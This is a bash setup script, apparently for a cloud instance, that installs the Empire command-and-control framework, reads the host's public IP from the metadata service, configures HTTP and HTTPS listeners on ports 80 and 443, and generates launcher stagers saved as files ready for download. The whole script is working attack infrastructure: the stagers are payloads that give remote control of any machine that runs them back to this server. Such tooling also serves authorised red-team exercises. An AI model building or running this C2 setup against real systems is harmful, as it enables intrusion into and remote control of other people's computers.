#! /bin/bash

# install deps
sudo apt-get update
sudo apt-get -y install git-core screen
sudo apt-get -y install python2.7 python2.7-dev
sudo ln -s /usr/bin/python2.7 /usr/bin/python

# install and configure empire
git clone https://github.com/EmpireProject/Empire
cd Empire
RANDKEY=`cat /dev/urandom | tr -dc '0-9' | fold -w ${1:-32} | head -1`
sudo STAGING_KEY=$RANDKEY ./setup/install.sh

# use this command to get the external ip of our instance
EIP=`curl -s http://169.254.169.254/latest/meta-data/public-ipv4`

# create our empire resource script
(
cat <<EOF
listeners
uselistener http
set Name http80
set Host http://$EIP:80
execute
listeners
uselistener http
set Name https443
set Host https://$EIP:443
set Port 443
execute
listeners
usestager multi/launcher
set Listener http80
set OutFile stager-http80.txt
generate
unset OutFile
generate
listeners
usestager multi/launcher
set Listener https443
set OutFile stager-https443.txt
generate
unset OutFile
generate

EOF
) > startup.rc

# start empire
screen -dmS empire sudo ./empire
# give empire time to start
sleep 5
# if you wanted to issue more commands, this is how you'd do it
screen -S empire -X stuff 'resource startup.rc\n'

# change perms on files for downloading
sleep 6
sudo chown ubuntu:ubuntu /home/ubuntu/Empire/stager-*
